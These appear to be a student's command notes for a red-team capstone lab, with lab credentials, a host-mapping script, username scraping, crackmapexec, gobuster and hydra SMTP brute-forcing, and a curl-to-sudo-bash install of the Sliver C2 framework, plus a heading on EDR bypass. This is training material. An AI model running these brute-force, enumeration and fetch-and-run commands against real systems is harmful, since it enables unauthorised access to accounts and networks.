# Red-Team-Capstone-Challenge CMD-by-CMDs


[[Red-Team-Capstone-Challenge-Credentials]]

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```
The password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character
* Special Characters: `  !@#$%^  `
```

```
ssh e-citizen@10.200.121.250
stabilitythroughcurrency

=======================================
Username: nvm
Password: PvH2VJqhnPMcbc0t
MailAddr: nvm@corp.th3reserve.loc
IP Range: 10.200.121.0/24
=======================================
```

Host management - update addDomainsToEctHosts.sh 
```bash
#!/bin/bash

echo "10.200.89.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.89.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.89.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.89.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.89.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
```


Initial
```bash
curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
cat images | cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
# Developer on the root webapge.
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
cat users.txt | awk '{print $1"@corp.thereserve.loc"}' >> emails.txt
echo "applications@corp.thereserve.loc" >> email.txt
crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
```

Silver and EDR bypassing Scarecrow
```go


```

New
```bash
# https://stackoverflow.com/questions/7110119/bash-history-without-line-numbers
history | cut -c 8-
```

```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list
mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Considerations
```
cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
```

## Installs

```bash
curl https://sliver.sh/install|sudo bash

sudo apt install thunderbird -y
# Authenicate
# ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
thunderbird
# nvm : nvm@corp.th3reserve.loc $somePassword
# Change the outbound server to 587

git clone https://github.com/r3nt0n/bopscrk.git
cd bopscrk;
pip3 install -r requirements.txt
python3 bopscrk.py -i
```
